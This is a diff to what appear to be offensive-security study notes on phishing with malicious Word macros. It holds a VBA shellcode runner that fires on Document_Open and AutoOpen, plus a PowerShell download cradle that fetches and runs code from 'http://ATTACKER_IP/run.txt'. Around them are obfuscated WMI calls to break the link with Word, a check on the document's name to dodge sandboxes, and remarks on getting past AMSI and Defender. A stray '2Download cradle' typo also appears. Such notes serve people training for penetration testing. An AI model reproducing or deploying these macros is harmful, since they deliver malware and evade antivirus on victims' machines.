@@ -14,6 +14,9 @@ tags:
 
 1. Create the Helper Project like in C# but using decimal values for the payload instead of hexadecimal for compatibility with VBA and inserting in the payload a new line every 50 characters due to VBA string limitation:
 ```csharp
+using System;
+using System.Text;
+
 namespace Helper
 {
     class Program
@@ -93,6 +96,7 @@ Function mymacro()
     Next counter
     
     res = CreateThread(0, 0, addr, 0, 0, 0)
+End Function
 
 Sub Document_Open()
     mymacro
@@ -101,9 +105,10 @@ End Sub
 Sub AutoOpen()
     mymacro
 End Sub
-
-End Function
 ```
+
+> [!Note]
+> The heuristic detection may be flagged so we can try first to remove it and check if it works.
 
 **Alternative Encryption + Heuristic Bypass**
 
@@ -214,7 +219,7 @@ Detection considerations:
 - Modern Defender (2023+) does scan `Assembly::Load()` buffers via AMSI's .NET integration — an AMSI bypass must precede this call.
 - The compiled assembly itself must be AV-clean (apply [[Signature Based Detection]] techniques to the binary before hosting it).
 
-See also: [[Phishing with Jscript]] for the DotNetToJScript equivalent and [[Bypassing AMSI With Reflection in PowerShell]] for the required AMSI bypass.
+See also: [[Phishing with Jscript (for emails)]] for the DotNetToJScript equivalent and [[Bypassing AMSI With Reflection in PowerShell]] for the required AMSI bypass.
 
 # Dechaining with WMI
 
@@ -243,7 +248,7 @@ End Sub
 > [!Note]
 > When performing an action, the Winmgmt WMI service is created in a separate process as a child process of [_Wmiprvse.exe_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/provider-hosting-and-security), which means we can de-chain the PowerShell process from Microsoft Word.
 
-Download cradle:
+2Download cradle:
 ```vb
 Sub MyMacro
   strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://ATTACKER_IP/run.txt'))"
@@ -286,8 +291,9 @@ To reduce the detection rate even further, we can perform a more complex obfusca
 
 - Encryption script:
 ```powershell
+# usage: encode.ps1 "string"
 # key = 17
-$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://ATTACKER_IP/run.txt'))"
+$payload = $args[0]
 
 [string]$output = ""
 
@@ -345,7 +351,7 @@ Function MyMacro()
     Dim Apples As String
     Dim Water As String
     
-    ' heuristics bypass: if the document name 
+    ' heuristics bypass: if the document name is different than the current name, we exit the function (encode the current doc name, for example runner.doc)
     If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
 	  Exit Function
 	End If
@@ -353,6 +359,7 @@ Function MyMacro()
     ' Place the encoded download cradle string here (powershell -ep bypass...)
     Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063066066074063066067065064115128128124063133137133056058058"
     Water = Nuts(Apples)
+    
 	' Place the encoded WMI strings here
 	GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
 End Function
@@ -386,7 +393,7 @@ For the emulator check, use the `DateDiff` sleep technique from the Bypassing An
 > Hint: chain the AES/XOR shellcode runner (above) with the sleep-timer sandbox check and use a staged payload (download cradle) to minimise the on-disk footprint.
 
 Extra Mile:
-**Process Hollowing + AV Bypass (Extra Mile)**
+TODO: **Process Hollowing + AV Bypass (Extra Mile)**
 
 Apply the full evasion stack to the process hollowing C# code from [[Process Injection and Migration]]:
 
